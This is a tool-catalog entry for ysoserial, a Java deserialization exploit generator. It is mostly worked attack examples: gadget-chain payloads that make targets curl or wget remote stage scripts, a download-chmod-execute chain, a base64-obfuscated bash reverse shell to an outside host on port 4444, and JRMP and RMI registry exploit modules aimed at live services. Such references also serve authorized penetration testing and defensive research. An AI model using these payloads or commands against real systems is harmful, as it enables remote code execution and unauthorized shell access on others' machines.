---
name: "ysoserial"
categories:
  - blackarch-webapp
version: "0.0.6"
homepage: "https://github.com/frohoff/ysoserial"
packaged-by: [blackarch]
blackarch-builddate: "2022-10-11"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "frohoff/ysoserial"
github-stars: 9094
github-pushed: "2025-12-04"
github-archived: false
github-issues: 47
github-match: "exact"
gh-checked: "2026-11-07"
worth: 6.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 1
gh-activity-checked: "2026-11-09"
---

# ysoserial

> A proof-of-concept generator that wraps a command in a Java gadget chain and emits a serialized payload for exploiting unsafe object deserialization.

## What it's for

Generates exploit payloads for Java applications that deserialize untrusted data. You pick a gadget chain — a library-specific object sequence (Apache Commons Collections, CommonsBeanutils, Spring, Groovy, BeanShell, C3P0, ROME and more) — and a command; ysoserial wraps the command in that chain and writes the serialized blob to stdout. When an application with the required libraries on its classpath deserializes the blob, the chain fires and the command executes on the application host. The vulnerability being exploited is the application's unsafe deserialization, not the presence of the libraries themselves. The main driver only produces the blob — you still have to place it where the target reads it (request parameter, cookie, file) — though bundled exploit modules deliver payloads over JRMP/RMI directly. It is Java-only; the sibling project [[ysoserial.net]] (pwntester — a separate project sharing only the name and the concept) is the equivalent for .NET targets.

## Typical use cases

### List the available gadget chains and their library dependencies

Run the jar with no arguments before choosing a payload.

```
java -jar ysoserial.jar
```

Outcome: prints the usage line plus the full payload table — every chain from AspectJWeaver, BeanShell1, CommonsBeanutils1 and CommonsCollections1 through CommonsCollections7, JRMPClient, ROME and Spring1/2 to URLDNS — each with its authors and the exact library versions required; match the chain whose dependencies the target application actually bundles.

### Generate a command-execution payload with curl delivery

Wrap a callback or download command in the most widely bundled gadget family.

```
java -jar ysoserial.jar CommonsCollections5 'curl http://198.51.100.10/stage.sh -o /tmp/stage.sh'
```

Outcome: writes the raw serialized payload to stdout (binary, starts `AC ED 00 05`) — redirect or paste it into whatever field the target deserializes; on success the curl request appears on your HTTP listener. CommonsCollections1/3/5/6/7 target commons-collections 3.x and CommonsCollections2/4 target commons-collections 4.x, so if one variant fails, regenerate with the next (CommonsCollections6 is the usual second choice).

### Probe blind deserialization with a ping callback

Confirm code execution on a Windows target that returns no visible response.

```
java -jar ysoserial.jar CommonsCollections2 'cmd /c ping -n 2 198.51.100.10' >> payload.bin
```

Outcome: appends the payload to `payload.bin`; when the target deserializes it, two ICMP packets arrive at 198.51.100.10 (watch with tcpdump) — proof that the sink is reachable and the chain fires before risking a real payload.

### Probe with a DNS-only payload that needs no libraries

Test whether an application deserializes attacker data at all when the classpath is unknown.

```
java -jar ysoserial.jar URLDNS 'http://probe-1234.example.com/'
```

Outcome: generates a payload with no third-party dependencies (works on stock JRE) that performs a single DNS resolution of the given URL's host when deserialized; a unique hostname per attempt visible at your authoritative DNS server confirms the deserialization sink end-to-end — the standard first probe before attempting command-execution chains.

### Embed the payload as base64 in a request parameter

Serialize and encode for transports that carry text, not bytes.

```
java -jar ysoserial.jar CommonsBeanutils1 'wget http://198.51.100.10/confirm' | base64 -w 0
```

Outcome: the binary blob encoded as a single base64 line, ready to paste into a cookie, JSON field or POST parameter of an endpoint that base64-decodes before deserializing; the embedded `wget` doubles as an application-level callback signal on your web server log.

### Stage a script through chained payloads

Work around one-shot command slots by chaining download, chmod and execution payloads.

```
java -jar ysoserial.jar CommonsBeanutils1 'curl http://198.51.100.10/rev.sh -o /tmp/rev.sh' | base64 -w 0
java -jar ysoserial.jar CommonsBeanutils1 'chmod 777 /tmp/rev.sh' | base64 -w 0
java -jar ysoserial.jar CommonsBeanutils1 'bash -c /tmp/rev.sh' | base64 -w 0
```

Outcome: three payloads submitted one after another into the same sink — the first fetches the second stage from your HTTP server, the second marks it executable, the third runs it; application errors between steps are expected as long as each stage registers on the listener.

### Inline reverse shell via brace-group base64

Get a shell in one payload when the command slot breaks spaces or ampersands.

```
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,$(echo -n 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1' | base64)}|{base64,-d}|{bash,-i}" > payload.ser
```

Outcome: writes the serialized payload to `payload.ser`; on the target, bash expands the brace groups into a pipe — `echo <base64> | base64 -d | bash -i` — with no spaces or redirection characters in the original string, dodging tokenizer breakage; a shell arrives on your `nc -lvnp 4444` listener. Payloads are best generated with the same Java version the target runs — reproduce it locally (e.g. in a container) if you have a replica of the server stack.

### Serve gadget payloads to connecting JRMP clients

Stand up a listener that hands the payload to targets that connect back over JRMP.

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'ping -c 1 198.51.100.10'
```

Outcome: opens a JRMP endpoint on port 1099; any client that opens a JRMP connection to it (an application that followed a serialized reference to your host) receives the generated CommonsBeanutils1 payload, and the ping confirms execution on your ICMP traffic — keep it running while triggering the victim's outbound connection.

### Push a payload to a live RMI registry endpoint

Deliver directly against an exposed Java RMI service instead of waiting for a callback.

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target.example.com 1099 CommonsCollections1 'whoami'
```

Outcome: connects to the RMI registry on the target, binds a malicious resource that deserializes the CommonsCollection1 gadget chain on lookup, and the command executes inside the RMI service; `ysoserial.exploit.JRMPClient <host> <port> <payload> <command>` does the same against a raw JRMP endpoint.
